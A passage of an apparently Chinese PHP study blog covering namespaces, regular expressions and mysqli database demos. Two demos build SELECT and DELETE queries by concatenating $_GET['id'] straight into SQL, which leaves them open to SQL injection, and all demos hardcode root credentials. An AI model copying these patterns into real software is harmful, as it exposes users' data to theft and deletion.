class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Dog</span><span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Dog_b'</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'say_b'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712110702599.png" alt="image-20210712110702599"></p><p>命名空间的引入</p><ol><li><p>空间引入方式：use关键字</p><p>​    引入类：use 空间名\类名</p><p>​    引入函数：use function 空间名\函数名</p><p>​    引入常量：use const 空间名\常量名</p></li><li><p>当引入元素时重名，通过 as 来起别名</p><p>use 空间名\类名 as 别名</p></li><li><p>引入多个元素</p><p>​    use 空间名{</p><p>​        类名，</p><p>​        function 函数名，</p><p>​        const 常量</p><p>​    }      </p></li><li><p>引入空间</p><p>use 空间名    </p></li></ol><p>demo3/demo5.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">one</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'demo4.php'</span><span class="token punctuation">;</span><span class="token comment">//echo \mydemo\b\NAME;</span><span class="token comment">//use 引用整个命名空间</span><span class="token keyword">use</span> <span class="token package"><span class="token punctuation">\</span>mydemo<span class="token punctuation">\</span>b</span> <span class="token keyword">as</span> aa<span class="token punctuation">;</span><span class="token keyword">echo</span> aa\<span class="token constant">NAME</span><span class="token punctuation">;</span><span class="token comment">//引入一个类</span><span class="token keyword">use</span> <span class="token package">mydemo<span class="token punctuation">\</span>b<span class="token punctuation">\</span>Dog</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//引入常量</span><span class="token keyword">use</span> <span class="token package">const</span> mydemo\b\<span class="token constant">NAME</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">NAME</span><span class="token punctuation">;</span><span class="token comment">//引入一个函数</span><span class="token keyword">use</span> <span class="token keyword">function</span> <span class="token package">mydemo<span class="token punctuation">\</span>b<span class="token punctuation">\</span>getName</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712111028267.png" alt="image-20210712111028267"></p><p>demo3/demo6.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">KKK</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'demo7.php'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token constant">__NAMESPACE__</span><span class="token operator">.</span><span class="token string double-quoted-string">"__getName"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> \<span class="token constant">KKK</span><span class="token function"><span class="token punctuation">\</span>a<span class="token punctuation">\</span>getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo3/demo7.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">KKK<span class="token punctuation">\</span>a</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token constant">__NAMESPACE__</span><span class="token operator">.</span><span class="token string double-quoted-string">"__getName"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712111138061.png" alt="image-20210712111138061"></p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><blockquote><p>正则表达式是用于描述字符排列和匹配模式的一种语法规则。它主要用于字符串的模式分割、匹配、查找及替换操作。到目前为止，我们前面所用过的精确（文本）匹配也是一种正则表达式。</p><p>在PHP中，正则表达式一般是由正规字符和一些特殊字符（类似于通配符）联合构成的一个文本模式的程序性描述。 </p><p>正则表达式较重要和较有用的角色是验证用户数据的有效性检查。</p><p>PHP中，正则表达式有三个作用：</p><ul><li> 匹配，也常常用于从字符串中析取信息。</li><li> 用新文本代替匹配文本。</li><li> 将一个字符串拆分为一组更小的信息块。</li></ul></blockquote><h3 id="正则表达式基本语法"><a href="#正则表达式基本语法" class="headerlink" title="正则表达式基本语法"></a>正则表达式基本语法</h3><p>PCRE库函数中，正则匹配模式使用<strong>分隔符与元字符</strong>组成。<strong>分隔符</strong>可以是<strong>非数字、非反斜线、非空格的任意字符</strong>。经常使用的分隔符是**正斜线(/)、hash符号(#) 以及取反符号(~)**。</p><p>元字符是用于构造规则表达式的具有特殊含义的字符。</p><p>如果要在正则表达式中包含元字符本身，必须在其前加上”\”进行转义。</p><p>元字符                 说明</p><p>*                      0次、1次或多次匹配其前的原子</p><p>+                     1次或多次匹配其前的原子</p><p>?                      0次或1次匹配其前的原子</p><p>|                      匹配两个或多个选择</p><p>^                     匹配字符串串首的原子</p><p>$                     匹配字符串串尾的原子</p><p>[]                     匹配方括号中的任一原子</p><p>[^]                   匹配除方括号中的原子外的任何字符</p><p>{m}                 表示其前原子恰好出现m次</p><p>{m,n}             表示其前原子至少出现m次，至多出现n次(n&gt;m)</p><p>{m,}                表示其前原子出现不少于m次</p><p>()                     整体表示一个原子</p><p>.                       匹配除换行之外的任何一个字符</p><p>\                      将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引               用、或一个八进制转义符。</p><h3 id="边界限制"><a href="#边界限制" class="headerlink" title="边界限制"></a>边界限制</h3><p>在某些情况下，需要对匹配范围进行限定，以获得更准确的匹配结果。</p><p>“^”和“$”分别指定字符串的开始和结束。</p><h3 id="重复匹配"><a href="#重复匹配" class="headerlink" title="重复匹配"></a>重复匹配</h3><p>正则表达式中有一些用于重复匹配某些原子的元字符：“?”、“*”、“+”。他们主要的不同是重复匹配的次数不同。</p><p>元字符“?”表示0次或1次匹配紧接在其前的原子。</p><p>元字符“*”:表示0次、1次或多次匹配紧接在其前的原子。</p><p>元字符“+”:表示1次或多次匹配紧接在其前的原子。</p><p>x|y    匹配 x 或 y。</p><p>[xyz]    字符集合。匹配所包含的任意一个字符。</p><p>[^xyz]    负值字符集合。匹配未包含的任意字符。</p><p>[a-z]    字符范围。匹配指定范围内的任意字符。</p><p>[^a-z]    负值字符范围。匹配任何不在指定范围内的任意字符。</p><p>\b    匹配一个单词边界，也就是指单词和空格间的位置。</p><p>\B    匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</p><p>\cx    匹配由 x 指明的控制字符。</p><p>\d    匹配一个数字字符。</p><p>\D    匹配一个非数字字符。</p><p>\f    匹配一个换页符。</p><p>\n    匹配一个换行符。</p><p>\r    匹配一个回车符。</p><p>\s    匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</p><p>\S    匹配任何非空白字符。</p><p>\t    匹配一个制表符。</p><p>\v    匹配一个垂直制表符。</p><p>\w    匹配包括下划线的任何单词字符。</p><p>\W    匹配任何非单词字符包括下划线。</p><p>\xn    匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。</p><p>\num    匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。</p><p>\n    标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。</p><p>\nm    标 识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。</p><p>\nml    如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。</p><p>\un    匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"www.baidu.com dab19e82e1f9a681ee73346d3e7a575e AAAA www.baidu.com dab19e82e1f9a681ee73346d3e7a575e AAAA"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z0-9]{32}/'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"匹配"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"匹配失败"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712115726304.png" alt="image-20210712115726304"></p><h2 id="php与mysql"><a href="#php与mysql" class="headerlink" title="php与mysql"></a>php与mysql</h2><p>demo4/demo1.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span><span class="token comment">//创建链接</span><span class="token variable">$conn</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//判断是否成功连接</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_error"</span><span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_connect successful"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//创建数据库</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"CREATE DATABASE mydata"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token comment">//判断sql语句是否成功执行</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Database created"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error creating database: "</span> <span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712112253824.png" alt="image-20210712112253824"></p><p><img src="/2021/07/08/60-zhi-day4/image-20210712112319204.png" alt="image-20210712112319204"></p><p>demo4/demo2.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mydata"</span><span class="token punctuation">;</span><span class="token comment">//创建链接</span><span class="token variable">$conn</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_error"</span><span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_connect successful"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//创建表</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"CREATE TABLE users (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,username VARCHAR(30) NOT NULL,password VARCHAR(30) NOT NULL,email VARCHAR(50));"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token comment">//判断sql语句是否成功执行</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"table created"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error creating table: "</span> <span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712112338455.png" alt="image-20210712112338455"></p><p><img src="/2021/07/08/60-zhi-day4/image-20210712112355027.png" alt="image-20210712112355027"></p><p>demo4/demo3.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mydata"</span><span class="token punctuation">;</span><span class="token comment">//创建链接</span><span class="token variable">$conn</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_error"</span><span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_connect successful"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//向数据库中插入内容</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO users (username,password,email) VALUES ('xiaoshaK','123456','admin@xiaoshaK.com')"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token comment">//判断sql语句是否成功执行</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"INSERT created"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error INSERT INTO table: "</span> <span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712112409748.png" alt="image-20210712112409748"></p><p><img src="/2021/07/08/60-zhi-day4/image-20210712112422956.png" alt="image-20210712112422956"></p><p>demo4/demo4.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mydata"</span><span class="token punctuation">;</span><span class="token comment">//创建链接</span><span class="token variable">$conn</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_error"</span><span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_connect successful"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//查询</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users where id="</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysqli error"</span><span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">error</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token property">num_rows</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">////判断是否查询到结果</span><span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"id: "</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">" - Name: "</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">""</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"result 0"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712112505399.png" alt="image-20210712112505399"></p><p>demo4/demo5.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span><span class="token string double-quoted-string">"123456"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mydata"</span><span class="token punctuation">;</span><span class="token comment">//创建链接</span><span class="token variable">$conn</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_error"</span><span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">connect_error</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysql_connect successful"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//删除数据</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"delete  FROM users where id="</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"mysqli error"</span><span class="token operator">.</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">error</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token property">num_rows</span><span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//sql语句正确执行  输出新建成功</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"删除成功"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"删除失败"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210712112924880.png" alt="image-20210712112924880"></p><p><img src="/2021/07/08/60-zhi-day4/image-20210712113012315.png" alt="image-20210712113012315"></p><p>demo4/demo6.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token 